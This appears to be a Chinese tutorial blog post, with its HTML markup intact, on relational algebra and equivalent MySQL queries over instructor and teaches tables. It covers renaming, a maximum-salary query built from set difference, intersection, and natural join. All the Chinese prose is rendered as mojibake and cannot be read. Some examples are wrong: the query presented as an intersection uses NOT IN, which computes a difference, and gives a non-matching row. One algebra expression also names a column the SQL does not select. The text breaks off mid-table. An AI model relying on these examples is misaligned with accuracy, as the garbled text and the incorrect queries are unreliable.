<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> id <span class="keyword">as</span> compid,name,age <span class="keyword">as</span> comage <span class="keyword">from</span> officer <span class="keyword">as</span> Companies <span class="keyword">where</span> position<span class="operator">=</span>&quot;Company&quot;;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------+--------+</span></span><br><span class="line"><span class="operator">|</span> compid <span class="operator">|</span> name  <span class="operator">|</span> comage <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------+--------+</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">4</span> <span class="operator">|</span> Rex   <span class="operator">|</span>     <span class="number">25</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">5</span> <span class="operator">|</span> Alpha <span class="operator">|</span>     <span class="number">23</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------+--------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢officerè¡¨ä¸­æ‰€æœ‰èŒä½ä¸ºè¿é•¿çš„å†›å®˜çš„(id,name,age),å¹¶ä¸”å°†å±æ€§æ”¹åä¸º(compid,name,comage),å°†è¯¥æŸ¥è¯¢å­è¡¨æ”¹åä¸ºCompanies</p>
<p>å†™æˆå…³ç³»ä»£æ•°ç›¸å½“äº<br>$$<br>\rho_{Companies(compid,name,comage)}(\Pi_{id,name,rank}(\sigma_{position&#x3D;Company}(officer)))<br>$$</p>
<h4 id="æŸ¥è¯¢è¡¨ä¸­çš„æœ€å¤§è–ªæ°´-Pi-salary-instructor-Pi-instructor-salary-sigma-instructor-salary"><a href="#æŸ¥è¯¢è¡¨ä¸­çš„æœ€å¤§è–ªæ°´-Pi-salary-instructor-Pi-instructor-salary-sigma-instructor-salary" class="headerlink" title="æŸ¥è¯¢è¡¨ä¸­çš„æœ€å¤§è–ªæ°´$\Pi_{salary}(instructor)-\Pi_{instructor.salary}(\sigma_{instructor.salary&lt;d.salary}(instructor\times \rho_d(instructor)))$"></a>æŸ¥è¯¢è¡¨ä¸­çš„æœ€å¤§è–ªæ°´$\Pi_{salary}(instructor)-\Pi_{instructor.salary}(\sigma_{instructor.salary&lt;d.salary}(instructor\times \rho_d(instructor)))$</h4><p>å‡è®¾æœ‰ä¸€å¼ è–ªæ°´è¡¨é•¿è¿™æ ·</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> instructor;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------------+-----------+--------+</span></span><br><span class="line"><span class="operator">|</span> ID    <span class="operator">|</span> name       <span class="operator">|</span> dept_name <span class="operator">|</span> salary <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------------+-----------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10101</span> <span class="operator">|</span> Srinivasan <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">65000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12121</span> <span class="operator">|</span> Wu         <span class="operator">|</span> Finance   <span class="operator">|</span>  <span class="number">90000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">15151</span> <span class="operator">|</span> Mozart     <span class="operator">|</span> Music     <span class="operator">|</span>  <span class="number">40000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">22222</span> <span class="operator">|</span> Einstein   <span class="operator">|</span> Physics   <span class="operator">|</span>  <span class="number">95000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">32343</span> <span class="operator">|</span> El Said    <span class="operator">|</span> History   <span class="operator">|</span>  <span class="number">60000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">33456</span> <span class="operator">|</span> Gold       <span class="operator">|</span> Physics   <span class="operator">|</span>  <span class="number">87000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">45565</span> <span class="operator">|</span> Katz       <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">75000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">58583</span> <span class="operator">|</span> Caliiferi  <span class="operator">|</span> History   <span class="operator">|</span>  <span class="number">62000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">76543</span> <span class="operator">|</span> Singh      <span class="operator">|</span> Finance   <span class="operator">|</span>  <span class="number">80000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------------+-----------+--------+</span></span><br><span class="line"><span class="number">9</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨è¦æŸ¥è¯¢è¡¨ä¸­çš„æœ€å¤§è–ªæ°´æ˜¯å¤šå°‘</p>
<p>ä¸€ç§æƒ³æ³•æ˜¯,å°†è¯¥è¡¨ä¸è‡ªå·±åšç¬›å¡ä¹˜,å‡è®¾è®°ä½œ$A\times B$</p>
<p>é‚£ä¹ˆå¯¹äºæœ€é«˜çš„è–ªæ°´x,ä¹Ÿå°±æ˜¯ä¸å­˜åœ¨æ¯”ä»–è¿˜é«˜çš„è–ªæ°´y</p>
<p>ä¹Ÿå°±æ˜¯è¯´æ‰¾ä¸åˆ°$a.x&lt;b.y$æ­¤æ—¶$a.x$å°±æ˜¯æœ€é«˜è–ªæ°´</p>
<p>â€œæ‰¾ä¸åˆ°â€è¿™ä¸ªä¸å¤§å¥½å®ç°,ä½†æ˜¯â€æ‰¾åˆ°$a.x&gt;b.y$â€å®¹æ˜“å®ç°,ç„¶åç”¨è–ªæ°´æ€»é›†å‡å»è¿™â€æ‰¾åˆ°é›†â€å°±æ˜¯â€æ‰¾ä¸åˆ°é›†â€</p>
<p>ä¹¦ä¸Šæ˜¯è¿™æ ·å†™çš„:<br>$$<br>\Pi_{salary}(instructor)-\Pi_{instructor.salary}(\sigma_{instructor.salary&lt;d.salary}(instructor\times \rho_d(instructor)))<br>$$<br><del>åˆè‡­åˆé•¿</del></p>
<p>å’‹ç†è§£å‘¢?è‡ªé¡¶å‘ä¸‹æ¥çœ‹,</p>
<p>æœ€é¡¶å±‚æ˜¯ä¸¤ä¸ªå…³ç³»é›†åˆçš„å·®,å·¦è¾¹æ˜¯instructorä¸­çš„æ‰€æœ‰è–ªæ°´ç»„æˆçš„é›†åˆ,</p>
<p>ç›¸å½“äº<code>select salary from instructor</code></p>
<p>å³ä¾§æ˜¯ä¸€å¤§å¨è¿ç®—ä¹‹åå¾—åˆ°çš„è¡¨ä¸­instructor.salaryç»„æˆçš„é›†åˆ,ä¸‹é¢ç€é‡åˆ†æä¸€ä¸‹å³è¾¹å¹²äº†å•¥,ä»æœ€é‡Œå±‚å¼€å§‹åˆ†æ</p>
<p>è‡ªä¸‹å¾€ä¸Šæ¥çœ‹</p>
<h5 id="æœ€é‡Œå±‚-rho-d-instructor"><a href="#æœ€é‡Œå±‚-rho-d-instructor" class="headerlink" title="æœ€é‡Œå±‚$\rho_{d}(instructor)$"></a>æœ€é‡Œå±‚$\rho_{d}(instructor)$</h5><p>å°†instructorè¡¨èµ·äº†ä¸€ä¸ªåˆ«åd,</p>
<p>ç›¸å½“äº<code>select * from instructor as d</code></p>
<h5 id="ç¬¬äºŒå±‚æ˜¯-instructor-times-rho-d-instructor"><a href="#ç¬¬äºŒå±‚æ˜¯-instructor-times-rho-d-instructor" class="headerlink" title="ç¬¬äºŒå±‚æ˜¯$instructor\times \rho_d(instructor)$"></a>ç¬¬äºŒå±‚æ˜¯$instructor\times \rho_d(instructor)$</h5><p>instructorå…³ç³»é›†åˆè‡ªå·±å’Œè‡ªå·±åšäº†ç¬›å¡å°”ç§¯,</p>
<blockquote>
<p>ä¸ºå•¥è¦èµ·åˆ«ådç„¶åç›¸ä¹˜å‘¢?ä¸ºäº†æ–¹ä¾¿åæ¥åˆ†åˆ«å¼•ç”¨ä¸¤ä¸ªè¡¨çš„å±æ€§.</p>
</blockquote>
<p>ç›¸å½“äº<code>select * from instructor as instructor cross join instructor as d;</code></p>
<blockquote>
<p>å‰é¢è¿™ä¸ªä¹Ÿå¿…é¡»èµ·ä¸€ä¸ªåˆ«å,mysqlå¼ºåˆ¶ä»¤ä»»ä½•è¿‡ç¨‹å­è¡¨éƒ½å¾—æœ‰åˆ«å,ä¹‹åæœ€åæ‰“å°åˆ°ç»ˆç«¯çš„ç»“æœè¡¨å¯ä»¥æ²¡æœ‰åˆ«å</p>
</blockquote>
<h5 id="ç¬¬ä¸‰å±‚æ˜¯-sigma-instructor-salary"><a href="#ç¬¬ä¸‰å±‚æ˜¯-sigma-instructor-salary" class="headerlink" title="ç¬¬ä¸‰å±‚æ˜¯$\sigma_{instructor.salary&lt;d.salary}(instructor\times \rho_d(instructor))$"></a>ç¬¬ä¸‰å±‚æ˜¯$\sigma_{instructor.salary&lt;d.salary}(instructor\times \rho_d(instructor))$</h5><p>ä¹Ÿå°±æ˜¯åœ¨ç¬¬äºŒå±‚çš„ç»“æœè¡¨ä¸­é€‰æ‹©,</p>
<p>ç›¸å½“äº<code>select * from instructor as d cross join instructor as instructor where instructor.salary &lt; d.salary;</code></p>
<h5 id="ç¬¬å››å±‚æ˜¯-Pi-instructor-salary-sigma-instructor-salary"><a href="#ç¬¬å››å±‚æ˜¯-Pi-instructor-salary-sigma-instructor-salary" class="headerlink" title="ç¬¬å››å±‚æ˜¯$\Pi_{instructor.salary}(\sigma_{instructor.salary&lt;d.salary}(instructor\times \rho_d(instructor)))$"></a>ç¬¬å››å±‚æ˜¯$\Pi_{instructor.salary}(\sigma_{instructor.salary&lt;d.salary}(instructor\times \rho_d(instructor)))$</h5><p>åœ¨ç¬¬ä¸‰å±‚çš„ç»“æœä¸Š,åªä¿ç•™$instructor.salary$è¿™ä¸€ä¸ªå±æ€§</p>
<p>ç›¸å½“äº<code> select instructor.salary from instructor as d cross join instructor as instructor where instructor.salary &lt; d.salary;</code></p>
<h5 id="æœ€é«˜å±‚æ˜¯-Pi-salary-instructor-Pi-instructor-salary-sigma-instructor-salary"><a href="#æœ€é«˜å±‚æ˜¯-Pi-salary-instructor-Pi-instructor-salary-sigma-instructor-salary" class="headerlink" title="æœ€é«˜å±‚æ˜¯$\Pi_{salary}(instructor)-\Pi_{instructor.salary}(\sigma_{instructor.salary&lt;d.salary}(instructor\times \rho_d(instructor)))$"></a>æœ€é«˜å±‚æ˜¯$\Pi_{salary}(instructor)-\Pi_{instructor.salary}(\sigma_{instructor.salary&lt;d.salary}(instructor\times \rho_d(instructor)))$</h5><p>å¯¹ä¸¤ä¸ªæ¬¡é«˜å±‚çš„è¿‡ç¨‹å­è¡¨åšå·®</p>
<p>ç›¸å½“äº<code> select salary from instructor where salary not in(select instructor.salary from instructor as d cross join instructor as instructor where instructor.salary &lt; d.salary);</code></p>
<p>è¿™ä¹ˆè€å¤ªå¤ªçš„è£¹è„šçš„ä¸€å¨,ç«Ÿç„¶è¯­æ³•æ²¡é”™èƒ½æŸ¥å‡ºæ¥,æœ‰ç‚¹å„¿ç¦»è°±</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> salary <span class="keyword">from</span> instructor <span class="keyword">where</span> salary <span class="keyword">not</span> <span class="keyword">in</span>(<span class="keyword">select</span> instructor.salary <span class="keyword">from</span> instructor <span class="keyword">as</span> d <span class="keyword">cross</span> <span class="keyword">join</span> instructor <span class="keyword">as</span> instructor <span class="keyword">where</span> instructor.salary <span class="operator">&lt;</span> d.salary);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> salary <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">95000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="äº¤-cap"><a href="#äº¤-cap" class="headerlink" title="äº¤$\cap$"></a>äº¤$\cap$</h3><p>mysqlä¸­æ²¡æœ‰äº¤è¿ç®—å…³é”®å­—,å¯ä»¥ä½¿ç”¨inå…³é”®å­—ä»£æ›¿</p>
<p>æ¯”å¦‚è¦æŸ¥è¯¢instructorè¡¨ä¸­ç‰©ç†è¡Œä¸šå­è¡¨å’Œè–ªæ°´è¶…è¿‡90kçš„äººçš„å­è¡¨,è¦æ±‚æŸ¥è¯¢æ‰€æœ‰ä¿¡æ¯<br>$$<br>\sigma_{dept_name&#x3D;Physics}(instructor)\cap \sigma_{salary&gt;90000}(instructor)<br>$$</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> instructor <span class="keyword">where</span> dept_name<span class="operator">=</span>&quot;Physics&quot; <span class="keyword">and</span> ID <span class="keyword">not</span> <span class="keyword">in</span>(<span class="keyword">select</span> ID <span class="keyword">from</span> instructor <span class="keyword">where</span> salary<span class="operator">&gt;</span><span class="number">90000</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------+-----------+--------+</span></span><br><span class="line"><span class="operator">|</span> ID    <span class="operator">|</span> name <span class="operator">|</span> dept_name <span class="operator">|</span> salary <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------+-----------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">33456</span> <span class="operator">|</span> Gold <span class="operator">|</span> Physics   <span class="operator">|</span>  <span class="number">87000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------+-----------+--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>ç”±äºè¿™æ˜¯åœ¨åŒä¸€å¼ è¡¨ä¸­æŸ¥è¯¢,å¯ä»¥å°†è¡¨äº¤å…³ç³»éƒ½æ”¾åˆ°è°“è¯é‡Œ<br>$$<br>\sigma_{dept_name&#x3D;Physics\ \land\ salary&gt;90000}(instructor)<br>$$</p>
<h3 id="è‡ªç„¶è¿æ¥-Join"><a href="#è‡ªç„¶è¿æ¥-Join" class="headerlink" title="è‡ªç„¶è¿æ¥$\Join$"></a>è‡ªç„¶è¿æ¥$\Join$</h3><h4 id="å·ç§¯è¿ç®—å®ç°è‡ªç„¶è¿æ¥åŠŸèƒ½"><a href="#å·ç§¯è¿ç®—å®ç°è‡ªç„¶è¿æ¥åŠŸèƒ½" class="headerlink" title="å·ç§¯è¿ç®—å®ç°è‡ªç„¶è¿æ¥åŠŸèƒ½"></a>å·ç§¯è¿ç®—å®ç°è‡ªç„¶è¿æ¥åŠŸèƒ½</h4><p>å‡è®¾æœ‰æ•™è®²å¸ˆåˆ—è¡¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> instructor;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------------+-----------+--------+</span></span><br><span class="line"><span class="operator">|</span> ID    <span class="operator">|</span> name       <span class="operator">|</span> dept_name <span class="operator">|</span> salary <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------------+-----------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10101</span> <span class="operator">|</span> Srinivasan <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">65000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12121</span> <span class="operator">|</span> Wu         <span class="operator">|</span> Finance   <span class="operator">|</span>  <span class="number">90000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">15151</span> <span class="operator">|</span> Mozart     <span class="operator">|</span> Music     <span class="operator">|</span>  <span class="number">40000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">22222</span> <span class="operator">|</span> Einstein   <span class="operator">|</span> Physics   <span class="operator">|</span>  <span class="number">95000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">32343</span> <span class="operator">|</span> El Said    <span class="operator">|</span> History   <span class="operator">|</span>  <span class="number">60000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">33456</span> <span class="operator">|</span> Gold       <span class="operator">|</span> Physics   <span class="operator">|</span>  <span class="number">87000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">45565</span> <span class="operator">|</span> Katz       <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">75000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">58583</span> <span class="operator">|</span> Caliiferi  <span class="operator">|</span> History   <span class="operator">|</span>  <span class="number">62000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">76543</span> <span class="operator">|</span> Singh      <span class="operator">|</span> Finance   <span class="operator">|</span>  <span class="number">80000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">76766</span> <span class="operator">|</span> Crick      <span class="operator">|</span> Biology   <span class="operator">|</span>  <span class="number">72000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">83821</span> <span class="operator">|</span> Brandt     <span class="operator">|</span> Comp.Sci. <span class="operator">|</span>  <span class="number">92000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">98345</span> <span class="operator">|</span> Kim        <span class="operator">|</span> Elec.Eng. <span class="operator">|</span>  <span class="number">80000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------------+-----------+--------+</span></span><br><span class="line"><span class="number">12</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰è¯¾ç¨‹åˆ—è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from teaches;</span><br><span class="line">+-------+-----------+--------+----------+------+</span><br><span class="line">| ID    | course_id | sec_id | semester | year |</span><br><span class="line">+-------+-----------+--------+----------+------+</span><br><span class="line">| 10101 | CS-101    |      1 | Fall     | 2017 |</span><br><span class="line">| 10101 | CS-315    |      1 | Spring   | 2018 |</span><br><span class="line">| 10101 | CS-347    |      1 | Fall     | 2017 |</span><br><span class="line">| 12121 | FIN-201   |      1 | Spring   | 2018 |</span><br><span class="line">| 15151 | MU-199    |      1 | Spring   | 2018 |</span><br><span class="line">| 22222 | PHY-101   |      1 | Fall     | 2017 |</span><br><span class="line">| 32343 | HIS-351   |      1 | Spring   | 2018 |</span><br><span class="line">| 45565 | CS-319    |      1 | Spring   | 2018 |</span><br><span class="line">| 76766 | BIO-101   |      1 | Summer   | 2017 |</span><br><span class="line">| 76766 | BIO-301   |      1 | Summer   | 2018 |</span><br><span class="line">| 83821 | CS-190    |      1 | Spring   | 2017 |</span><br><span class="line">| 98345 | EE-181    |      1 | Spring   | 2017 |</span><br><span class="line">+-------+-----------+--------+----------+------+</span><br><span class="line">12 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>teachesè¡¨ä¸­çš„IDæ˜¯æŒ‡ä»»è¯¾æ•™å¸ˆç¼–å·,course_idæ‰æ˜¯è¿™é—¨è¯¾çš„ç¼–å·</p>
<p>æ¯”å¦‚CS-101å¯èƒ½å°±æ˜¯è®¡å¯¼</p>
</blockquote>
<p>ç°åœ¨è¦æŸ¥è¯¢Srinivasanè€å¸ˆæ•™å“ªäº›è¯¾</p>
<p>æ˜¾ç„¶å¯ä»¥ä½¿ç”¨ç¬›å¡å°”ç§¯ç„¶åçº¦æŸteaches.ID&#x3D;instructor.ID</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> inst.name,teac.course_id</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">from</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>     (<span class="keyword">select</span> ID,name <span class="keyword">from</span> instructor <span class="keyword">where</span> name<span class="operator">=</span>&quot;Srinivasan&quot;) <span class="keyword">as</span> inst</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>         <span class="keyword">cross</span> <span class="keyword">join</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>     (<span class="keyword">select</span> ID,course_id <span class="keyword">from</span> teaches)<span class="keyword">as</span> teac</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">where</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>     inst.ID<span class="operator">=</span>teac.ID;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> name       <span class="operator">|</span> course_id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> Srinivasan <span class="operator">|</span> CS<span class="number">-101</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Srinivasan <span class="operator">|</span> CS<span class="number">-315</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Srinivasan <span class="operator">|</span> CS<span class="number">-347</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.03</span> sec)</span><br></pre></td></tr></table></figure>

<p>å†™æˆå…³ç³»ä»£æ•°çš„å½¢å¼<br>$$<br>\Pi_{inst.name,teac.course_id}(<br>    \sigma_{inst.ID&#x3D;teac.ID}(</p>
<pre><code>    \rho_&#123;inst&#125;(\Pi_&#123;name,ID&#125;(instructor))
        \times
    \rho_&#123;teac&#125;(\Pi_&#123;ID,course\_id&#125;(teaches))

)
</code></pre>
<p>)<br>$$</p>
<p>æ˜¾ç„¶è¿™æ ·ä¼šé€ æˆå¾ˆå¤šä¸å¿…è¦çš„è®¡ç®—,åº”è¯¥ä½¿ç”¨è‡ªç„¶è¿æ¥ç®€åŒ–è¿ç®—</p>
<h4 id="å®é™…ä¸Šçš„è‡ªç„¶è¿æ¥"><a href="#å®é™…ä¸Šçš„è‡ªç„¶è¿æ¥" class="headerlink" title="å®é™…ä¸Šçš„è‡ªç„¶è¿æ¥"></a>å®é™…ä¸Šçš„è‡ªç„¶è¿æ¥</h4><p>ä½¿ç”¨å·ç§¯çš„æ—¶å€™,æ¯ä¸ªè®²å¸ˆä¼šå’Œæ¯ä¸ªè¯¾ç¨‹ç»„åˆä¸€ä¸‹,ä½†æ˜¯æ˜¾ç„¶æ•™ç‰©ç†çš„æ•™ä¸äº†é‡‘è</p>
<p>å¹¶ä¸”teachesè¡¨ä¸­çš„IDåˆ—å·²ç»ç»™å‡ºäº†è¿™é—¨è¯¾åˆå“ªä¸ªè€å¸ˆæ•™,ä½¿ç”¨å·ç§¯ç»„åˆæ—¶é™¤äº†è€å¸ˆID&#x3D;è¯¾è€å¸ˆIDè¿™ç§ç»„åˆæ˜¯æœ‰æ•ˆçš„,å…¶ä»–ç»„åˆéƒ½æ˜¯å¯‚å¯</p>
<p>åº”è¯¥åªä¿ç•™è€å¸ˆID&#x3D;è¯¾è€å¸ˆIDçš„ç»„åˆ,è¿™å°±æ˜¯è‡ªç„¶è¿æ¥äº†</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> name,course_id <span class="keyword">from</span> (instructor <span class="keyword">natural</span> <span class="keyword">join</span> teaches) <span class="keyword">where</span> instructor.name<span class="operator">=</span>&quot;Srinivasan&quot;;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> name       <span class="operator">|</span> course_id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> Srinivasan <span class="operator">|</span> CS<span class="number">-101</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Srinivasan <span class="operator">|</span> CS<span class="number">-315</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Srinivasan <span class="operator">|</span> CS<span class="number">-347</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>



<p>å†™æˆå…³ç³»ä»£æ•°å°±æ˜¯<br>$$<br>\Pi_{name,course_id}(\sigma_{instructor.name&#x3D;Srinivasan}(instructor\Join teaches))<br>$$</p>
<h4 id="è‡ªç„¶è¿æ¥å’Œå·ç§¯çš„å…³ç³»"><a href="#è‡ªç„¶è¿æ¥å’Œå·ç§¯çš„å…³ç³»" class="headerlink" title="è‡ªç„¶è¿æ¥å’Œå·ç§¯çš„å…³ç³»"></a>è‡ªç„¶è¿æ¥å’Œå·ç§¯çš„å…³ç³»</h4><p>è®¾r,sæ˜¯ä¸¤ä¸ªå…³ç³»,$r\Join s$è¡¨ç¤ºä¸¤ä¸ªå…³ç³»çš„è‡ªç„¶è¿æ¥,R,Såˆ†åˆ«è¡¨ç¤ºä¸¤ä¸ªå…³ç³»çš„å±æ€§é›†åˆ</p>
<p>æ€»ç»“ä¸€ä¸‹è‡ªç„¶è¿æ¥åº”è¯¥æ€ä¹ˆç”¨ä½çº§çš„å…³ç³»ä»£æ•°å¼è¡¨ç¤º</p>
<blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (instructor <span class="keyword">natural</span> <span class="keyword">join</span> teaches);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------------+-----------+--------+-----------+--------+----------+------+</span></span><br><span class="line"><span class="operator">|</span> ID    <span class="operator">|</span> name       <span class="operator">|</span> dept_name <span class="operator">|</span> salary <span class="operator">|</span> course_id <span class="operator">|</span> sec_id <span class="operator">|</span> semester <span class="operator">|</span> 